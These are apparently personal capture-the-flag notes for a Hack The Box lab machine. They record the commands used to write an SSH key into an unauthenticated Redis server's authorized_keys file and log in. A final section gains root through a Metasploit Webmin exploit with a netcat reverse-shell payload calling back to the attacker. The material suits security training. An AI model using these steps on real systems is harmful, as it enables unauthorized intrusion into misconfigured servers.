// Findings

website runs at:
10.10.10.160

$ nmap -sV -sC -oA nmap 10.10.10.160

save a dirbuster output results
$ dirb http://10.10.10.160 -r -o dirb.dirb

available ports: 80, 10000,  6379


we can telnet to 6379 port with

$ telnet 10.10.10.160 6379

it is redis telnet




// redis user


sources:
https://zhuzhuuu.com/pentesting-lab/2018-07/redis-unauthorized-access-vul


$ cd
$ wget http://download.redis.io/releases/redis-3.2.11.tar.gz
$ tar xzf redis-3.2.11.tar.gz
$ cd redis-3.2.11
$ make

$ ssh-keygen -t rsa

at ~/.ssh directory, type
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt






the following commands have to be executed as fast as possible,
because many other users are setting their rsa_id to s-key.

$ cat ~/.ssh/temp.txt | ~/redis-3.2.11/src/redis-cli -h 10.10.10.160 -x set s-key
OK

$ ~/redis-3.2.11/src/redis-cli -h 10.10.10.160
   get s-key       # see if ssh key has the rsa 
   config get dir   # get your redis directory 
   config set dir .../.sh               # back up location for the .ssh folder
   config set dbfilename authorized_keys
   save      # lastly we back our data containing our "s-key" key-value pair up in the .ssh folder


we definitely need to run 
get s-key
config set dir /var/lib/redis/.ssh
config set dbfilename authorized_keys
save

quickly run the following command in ~/.ssh directory
$ ssh -i id_rsa redis@10.10.10.160

if it promts for password then repeat all the steps from the cat command

sources:
https://zhuzhuuu.com/pentesting-lab/2018-07/redis-unauthorized-access-vul





// Matt user






// root


Run msfconsole (metasploit framework)
search for "webmin" exploits in msfconsole

select the following exploit

exploit/linux/http/webmin_packageup_rce

we set the username and password of Matt user, as
it is the last user we gained access to.

set payload cmd/unix/reverse_netcat 
as netcat exists in the Matt user.

as LHOST, we set the IPv4 from our HTB account
Similarly for LPORT. (This info can be found at the Access page of
HTB while logged in)